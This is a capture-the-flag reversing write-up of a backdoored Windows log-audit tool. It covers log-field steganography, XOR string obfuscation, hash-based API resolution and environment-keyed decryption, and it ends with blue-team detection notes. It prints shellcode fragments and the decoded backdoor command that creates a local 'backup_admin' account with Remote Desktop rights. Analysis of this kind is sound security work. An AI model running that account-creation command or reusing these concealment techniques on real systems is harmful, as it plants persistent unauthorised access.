---
title: "HTB CA2026 — CorpSyncAudit: Log Steganography Triggering a Shellcode Dropper"
platform: Hack The Box
event: "Cyber Apocalypse CTF 2026: The Salt Crown"
challenge: CorpSyncAudit
app: CorpSync Replication Audit Tool
category: reversing
difficulty: hard
points: 975
solves: 110
type: writeup
status: complete
mitre:
  - T1195.002
  - T1027
  - T1027.007
  - T1001.002
  - T1622
  - T1497.001
  - T1136.001
  - T1021.001
tags:
  - writeup
  - HTB
  - Security
  - Reverse_Engineering
  - Malware_Analysis
  - Windows
related:
  - "[[HTB]]"
  - "[[HTB-CA2026-Cinder-Engine-AArch64-VM-SPN-Inversion]]"
  - "[[HTB-CA2026-First-Mark-RISCV-Custom-Opcode-Recovery]]"
aliases:
  - CorpSyncAudit
  - CA2026 CorpSyncAudit
created: 2026-07-25T03:34:04.396Z
updated: 2026-07-25T04:41:07.265Z
---

# CorpSyncAudit — Log Steganography Triggering a Shellcode Dropper

> [!success] Solved
> Flag: `HTB{d473_71m3_4nd_64ckd00r5}` — base64 password inside the shellcode's `net user` command.
> Solved 2026-07-24 23:33 local. Windows PE + 33 log files, no server.

## 0. How the flag was obtained

1. `grep -L 'LIVE_SYNC' logs/*.log` — isolated **one** carrier among 33 in a single command. Its filename encodes second `64`, which does not exist.
2. Compared formats: clean logs write `MM/DD/YYYY` with a correct weekday; the carrier's first date field takes values like `16`, `28` — impossible as months, therefore a data channel.
3. Found the string decryptor at `0x1400016c0` (XOR key `9f 50 66 20`, cycling `i&3`) and swept all 70 call sites — recovered `explorer.exe`, `C:\hyberfile.sys`, `GMT`, the region vocabulary.
4. Read the parser at RVA `0x3827`: `sscanf` on the date line, then a **region → 5-bit** lookup in a 32-entry table (FNV-1a + `ror64(h,13)` + Murmur3 `fmix64`). All 13 carrier regions hit the table; none of the clean-log regions did — confirming the alphabet.
5. Decoded each entry: the 5 bits conditionally mask `hh^12`, `mm^30`, `ss^30`, `day^16`, `month^6`; `GMT` triggers a reversible 3-way mix; fields pack into a 32-bit word; each byte XORs the weekday index + 1.
6. Derived the final key **statically** — the accumulator at `0x140001a5a` is two fixed-length counter sums, and `0xf07ec6a4` appears hardcoded at `0x140001b20` as the API-resolution key.
7. Decoded 396 bytes of x64 shellcode; at offset `0x10b`, `net user backup_admin <base64> /add`. Base64-decoding the password gives the flag.

## 1. Shape of the challenge

`CorpSyncAudit.exe` — 414,720 bytes, `PE32+ GUI x86-64`, MinGW-w64 C++ (`libgcc_s_seh-1.dll`, `libstdc++-6.dll`), stripped to an external PDB. Plus a `logs/` directory holding 33 `sync_*.log` files.

The scenario names the objective precisely:

> *"Somewhere in that binary, past the imports it doesn't want you to find, is a parsing path that was never meant to run during a normal audit, and a log file crafted to wake it up."*

Both halves are literal. The imports are resolved by hash, and exactly one of the 33 logs is the wake-up call.

## 2. Triage — finding the carrier

The import table already tells the story:

- `LoadLibraryA` + `GetProcAddress` — dynamic resolution
- `WSAStartup`, `socket`, `connect`, `send`, `recv`, `inet_pton`, `ioctlsocket`, `closesocket` — a complete Winsock client
- One plaintext string of interest: `127.0.0.1`

Log classification is a single command:

```bash
grep -L 'LIVE_SYNC' logs/*.log     # -> exactly one file
```

| | Clean (32 files) | Carrier (1 file) |
|---|---|---|
| Header | `--- START REPLICATION SESSION: LIVE_SYNC ---` | `... : 2026-05-21T15:06:54.187353 ---` |
| Entries | 7 | 99 |
| Latency | 0.40–0.58 ms | 1–15 ms |
| Dates | sequential, one second apart | sprayed across 1991–2049 |
| Regions | `HEADQUARTERS`, `BRANCH_OFFICE_A/B`, `DEV_SANDBOX`, … | `WORLD`, `SUB_SAHARAN_AFRICA`, `NORTH_AMERICA`, … |

The carrier is `sync_20260412_192364.log` — and its **filename encodes second `64`**, which does not exist. The first tell was free.

A second tell, before any disassembly: clean logs write `Thursday, 05/21/2026`, i.e. **MM/DD/YYYY**, and 21 May 2026 genuinely was a Thursday. The carrier's first date field takes values like `16`, `23`, `28`, `29` — impossible as months. Field one is data wearing a month's clothes.

## 3. The obfuscation layer

`strings` finds no `Region`, `LIVE`, `USN`, or weekday names — they are XOR-encrypted and decrypted on demand by a helper at `0x1400016c0`:

```
key = 0x2066509f  ->  bytes 9f 50 66 20
for i in 0 .. len-2:  out[i] = src[i] ^ key[i & 3]
```

Sweeping every call site (`lea rdx,[rip+enc]` / `mov r8d,len` / `call 0x1400016c0`) recovers **70 strings**, including `C:\hyberfile.sys` (a typosquat of `hiberfil.sys`), `explorer.exe`, `GMT`, `--- START REPLI`, and the whole region/weekday vocabulary.

## 4. The parsing path

The parser lives at RVA `0x3827`. For each log line containing `Region=` it runs:

```
sscanf(line, "%63[^,], %d/%d/%d %d:%d:%d %15s %15s", wd,&dd,&mo,&yr,&hh,&mi,&ss,ampm,tz)
```

and requires **all 9 conversions** to succeed. Only lines carrying a region that resolves in a 32-entry table are decoded; everything else falls through to a harmless `[LIVE]` counter. That is why the 32 clean logs produce nothing — **none of their corporate region names hash into the table**, while all 13 of the carrier's geographic names do. The table *is* the covert alphabet.

## 5. The steganographic encoding

**Region → 5 bits.** The region string is hashed and looked up in a 32-entry table at `0x14001d680`. The hash is FNV-1a with case folding, a rotate per byte, and a MurmurHash3 finalizer:

```python
def H(s):
    h = 0xcbf29ce484222325
    for ch in s.upper().encode():
        h = ((h ^ ch) * 0x100000001b3) & M64
        h = ror64(h, 13)
    h ^= h >> 33; h = (h * 0xff51afd7ed558ccd) & M64
    h ^= h >> 33; h = (h * 0xc4ceb9fe1a85ec53) & M64
    h ^= h >> 33
    return h
```

**Those 5 bits are conditional masks**, applied by the helper at `0x140003117`:

```
g(value, _, range, half, bit) = value ^ half  if bit == '1' else value
```

| Bit (MSB→LSB) | Field | Mask |
|---|---|---|
| 4 | `hh` | `^12` (range 24) |
| 3 | `mm` | `^30` (range 60) |
| 2 | `ss` | `^30` (range 60) |
| 1 | `day` | `^16` (range 31) |
| 0 | `month` | `^6` (range 13) |

**Timezone selects a mix.** If `tz == "GMT"` the fields are pre-transformed reversibly at `0x14000314a`:

```
m = (hh + mm - ss) // 2
hh, mm, ss = hh - m, m, mm - m
```

**Packing.** The unmasked fields form a 32-bit word:

```
result = hh<<27 | mm<<21 | ss<<15 | day<<10 | month<<6 | (year - 1990)
```

**Salt.** Each of the four output bytes is XORed with the weekday's index **plus one** (`Monday`=1 … `Sunday`=7), from a decrypted 7-name table.

99 entries × 4 bytes = a 396-byte stream.

## 6. The key — anti-analysis that defeats itself

The final XOR key is a dword built at `0x140001a5a` from five terms:

| Offset | Source | Clean-host value |
|---|---|---|
| `+0x00` | debugger check | `0` |
| `+0x04` | `GetLastError` after `CreateFileA("C:\hyberfile.sys")` | `2` (FILE_NOT_FOUND) |
| `+0x08` | `SIDT` limit — Red Pill VM detection | fixed per host |
| `+0x0c` | `(ticks_after - ticks_before) >> 10` | `0` unless slowed past ~1 s |
| `+0x10` | accumulator | deterministic |

`key = XOR of all five`.

The accumulator looks environment-dependent but is not — two loops of fixed length that add only their own counters, with the API calls inside as decoration:

```python
acc = sum(range(0, 0x4f671 + 1))
for j in range(0, 0x2b156 + 1):
    acc = (acc + j) & 0xffffffff
    if j == 0x2b44: acc ^= 0x424a
# acc = 0xf07ec90c
```

**The giveaway:** `0xf07ec6a4` is hardcoded at `0x140001b20` as the API-resolution hash key, and it differs from `acc` by exactly the XOR of the environment terms. So the true key is `0xf07ec6a4`, derivable on paper — **no execution, no debugger, no VM required.** The anti-analysis funnels every check into one XOR, and publishes the answer elsewhere in the same function.

## 7. The payload

Decoding the 396-byte stream with `0xf07ec6a4` (big-endian, cycling) yields x64 shellcode:

```
fc                cld
4883e4f0          and  rsp, -0x10
e8c0000000        call ...
41514150 52 51 56 push r9, r8, rdx, rcx, rsi
4831d2            xor  rdx, rdx
65488b5260        mov  rdx, gs:[0x60]      ; PEB
488b5218          mov  rdx, [rdx+0x18]     ; Ldr
488b5220          mov  rdx, [rdx+0x20]     ; InMemoryOrderModuleList
```

A textbook msfvenom-style PEB-walking API-hash stub, and at offset `0x10b` the command it exists to run:

```
net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add
&& net localgroup "Remote Desktop Users" backup_admin /add
```

A persistent local account with RDP rights — *"a door into every machine that ever passed the test."* The account password is the flag, base64-encoded:

```python
base64.b64decode("SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==")
# HTB{d473_71m3_4nd_64ckd00r5}
```

## 8. Final payload

The complete decode, from carrier log to flag:

```python
import re, struct, base64
M = (1<<64) - 1
d   = open('CorpSyncAudit.exe','rb').read()
tbl = [struct.unpack('<Q', d[0x1b680+8*i:0x1b680+8*i+8])[0] for i in range(32)]
ror = lambda x,n: ((x>>n)|(x<<(64-n))) & M

def H(s):                                   # FNV-1a + ror13 + Murmur3 fmix64
    h = 0xcbf29ce484222325
    for ch in s.upper().encode():
        h = ((h ^ ch) * 0x100000001b3) & M; h = ror(h, 13)
    h ^= h>>33; h = (h * 0xff51afd7ed558ccd) & M
    h ^= h>>33; h = (h * 0xc4ceb9fe1a85ec53) & M
    return h ^ (h>>33)

WD = ['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday']
pat = r'(\w+), (\d+)/(\d+)/(\d+) (\d+):(\d+):(\d+) (AM|PM) (\w+) \| Region=(\S+)'
B = b''
for line in open('logs/sync_20260412_192364.log'):
    m = re.match(pat, line)
    if not m: continue
    wd,dd,mo,yr,hh,mi,ss,ap,tz,rg = m.groups()
    dd,mo,yr,hh,mi,ss = map(int,(dd,mo,yr,hh,mi,ss))
    if tz == 'GMT':                         # reversible 3-way mix
        k = (hh+mi-ss)//2; hh,mi,ss = hh-k, k, mi-k
    b = f'{tbl.index(H(rg)):05b}'           # region -> 5 mask bits
    hh = hh^12 if b[0]=='1' else hh
    mi = mi^30 if b[1]=='1' else mi
    ss = ss^30 if b[2]=='1' else ss
    dd = dd^16 if b[3]=='1' else dd
    mo = mo^6  if b[4]=='1' else mo
    r = ((hh&0x1f)<<27)|((mi&0x3f)<<21)|((ss&0x3f)<<15)| \
        ((dd&0x1f)<<10)|((mo&0xf)<<6)|((yr-1990)&0x3f)
    s = WD.index(wd) + 1                    # weekday salt
    B += bytes(((r >> (24-8*i)) & 0xff) ^ s for i in range(4))

KEY = (0xf07ec6a4).to_bytes(4,'big')        # derived statically, see §6
sc  = bytes(B[i] ^ KEY[i%4] for i in range(len(B)))
cmd = re.search(rb'net user[ -~]+', sc).group().decode()
b64 = re.search(r'backup_admin (\S+) /add', cmd).group(1)
print(base64.b64decode(b64).decode())       # HTB{d473_71m3_4nd_64ckd00r5}
```

## 9. Tools & techniques
`objdump` / Capstone (x86-64 disassembly) · `readelf` (PE section + import mapping) · Python (decoder, hash reimplementation) · `grep -L` (corpus triage)
Concepts: log steganography · covert channel in timestamp fields · XOR string obfuscation · custom hash (FNV-1a + rotate + Murmur3 finalizer) · dynamic API resolution by hash · environment-keyed XOR · anti-VM (`SIDT` red pill) · x64 PEB-walking shellcode

## 10. MITRE ATT&CK
- **T1195.002** Supply Chain Compromise: Compromise Software Supply Chain — a paid contractor inserted the backdoor into compliance tooling every organisation was required to install
- **T1027** Obfuscated Files or Information — all strings XOR-encrypted with a 4-byte cycling key, decrypted on demand
- **T1027.007** Dynamic API Resolution — `LoadLibraryA`/`GetProcAddress` plus four APIs resolved by 64-bit hash, keyed on the environment fingerprint
- **T1001.002** Data Obfuscation: Steganography — the payload is encoded in the date, time, timezone and region fields of an otherwise ordinary-looking replication log
- **T1622** Debugger Evasion — timing loop whose elapsed delta feeds the decryption key
- **T1497.001** Virtualization/Sandbox Evasion: System Checks — `SIDT` (Red Pill) result folded into the same key
- **T1136.001** Create Account: Local Account — `net user backup_admin … /add`
- **T1021.001** Remote Services: Remote Desktop Protocol — the account is added to `Remote Desktop Users`

## 11. Detection / blue-team & fix notes
- **Fix (primary):** the audit tool is the compromise. Compliance software mandated across an estate is a supply-chain single point of failure — require reproducible builds and independent binary review before mandating installation. "The contractor delivered exactly what was asked for on paper" is the whole attack.
- **Detection — host:** a process creating a local account and adding it to `Remote Desktop Users` is the highest-fidelity signal here and needs no knowledge of the encoding. Alert on `net user … /add` and `net localgroup "Remote Desktop Users"` from any non-administrative parent, especially a compliance or monitoring binary.
- **Detection — static:** an import table containing both `LoadLibraryA`/`GetProcAddress` **and** a full Winsock client (`WSAStartup`, `socket`, `connect`, `send`, `recv`) in a tool that has no legitimate networking purpose. Dynamic resolution plus sockets in an offline log parser is not a normal combination.
- **Detection — data:** the carrier log is trivially separable from the clean ones without any reversing. Validate log files against their own schema: impossible field values (month `16`, second `64`), weekdays that contradict their dates, and a session header that departs from the fixed `LIVE_SYNC` form. **A parser that accepts fields it could never have written is the bug.**
- **Detection — behavioural:** `SIDT` execution from userland has essentially no benign use and is observable via EDR instruction tracing. Same for a tight fixed-count loop bracketed by tick counters.
- **Note on the anti-analysis:** it was self-defeating. Every environment check folded into one XOR, and the expected clean-host result appeared as a hardcoded constant elsewhere in the same function. Evasion that funnels through a single choke point hands the analyst a known-plaintext oracle.

## 12. Method notes

- **Classify the corpus before reversing the parser.** `grep -L 'LIVE_SYNC' logs/*.log` isolated the carrier in one command and reduced 33 files to 1. Structural triage of the *data* is cheaper than static analysis of the *code*, and it framed everything after it.
- **Impossible field values are the loudest signal in steganography.** A month of `16`, a second of `64` in a filename, a weekday that contradicts its date — each says "this field is not what it claims." Establishing the clean logs' format first (`MM/DD/YYYY`, verified against a real calendar) is what made the anomaly legible.
- **A validated hash table is proof of a decoding hypothesis.** All 13 carrier regions hit a 32-entry table and none of the 7 clean-log regions did. Chance is negligible, so the region-to-index mapping was confirmed before it was used for anything.
- **A flat known-plaintext score is evidence, not failure.** Assuming `HTB{` and solving each key byte independently produced 262/396 printable — barely above the ~37% random baseline and nowhere near the ~100% a correct text decode gives. That number said *the payload is not text*, which redirected effort from key-hunting to static key derivation. Read the score as information about the plaintext's nature, not as a signal to try harder.
- **Anti-analysis with a single choke point is a gift.** `SIDT`, the debugger check and the timing loop all fold into one XOR. Finding a constant elsewhere in the binary that the clean-host computation must equal collapsed the whole defence without running the sample once.
- **Do not execute the sample to answer a question static analysis can answer.** Running under Wine would have produced the *wrong* key — the environment terms differ from a real Windows host — giving an authoritative answer to the wrong question, while executing live malware on a working machine.

## 13. Open items

- The four hash-resolved APIs at `0x140001f3e` (`0x5be7b941307091dc`, `0x5a497cee8ca842ae`, `0x97fdb6665e097daf`, `0x1d4481b9f31b0f34`) were never resolved to names. They are presumably `VirtualAlloc` / `CreateThread` / `WaitForSingleObject` or similar, but this was not confirmed by brute-forcing the hash against an export list.
- The Winsock imports and `127.0.0.1` were never traced to a concrete call path; whether the reverse-shell code is reachable, dead, or a second stage is unestablished.
- `explorer.exe` is decrypted inside the parser but its use (injection target?) was not followed.
- The exact `SIDT` limit the author expected was not determined — the key was confirmed by matching the hardcoded `0xf07ec6a4` rather than by computing every term.
- The 19 unused slots in the 32-entry region table were not reversed; they may encode additional alphabet symbols for longer payloads.

## Cross-references
- [[HTB-CA2026-Cinder-Engine-AArch64-VM-SPN-Inversion]]
- [[HTB-CA2026-First-Mark-RISCV-Custom-Opcode-Recovery]]
- [[HTB]]

## Change Log
- 2026-07-25 — Note created. Full solve documented: corpus triage isolating 1 carrier log of 33, recovery of the XOR string-obfuscation layer and all 70 hidden strings, the sscanf trigger path, the region→5-bit hash alphabet (FNV-1a + ror13 + Murmur3 fmix64), conditional field masking, the GMT mix, 32-bit packing and weekday salt, static derivation of the environment-keyed XOR (`0xf07ec6a4`), and extraction of the x64 shellcode carrying the `net user backup_admin` persistence command containing the flag.
